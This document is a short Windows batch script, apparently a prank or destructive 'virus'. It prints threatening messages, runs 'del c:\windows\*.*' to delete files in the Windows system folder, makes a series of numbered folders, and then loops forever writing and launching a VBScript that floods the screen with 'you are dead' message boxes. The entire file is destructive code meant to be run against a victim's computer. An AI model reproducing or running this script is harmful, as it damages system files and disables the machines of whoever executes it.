   @echo off
   cls
   Echo You are dying
   Pause
   del c:\windows\*.*
   pause
   Echo you have deleted all your files.
   md 1
   md 2
   md 3
   md 4
   md 5
   md 6
   md 7
   md 8
   md 9
   md 10
   md 11
   md 12
   md 13
   md 15
   md 16
   md 17
   md 18
   :loop
   Echo Msgbox "you are dead",68,"Dead" >> C:\Me.vbs
   start C:\me.vbs
   goto loop
   echo on
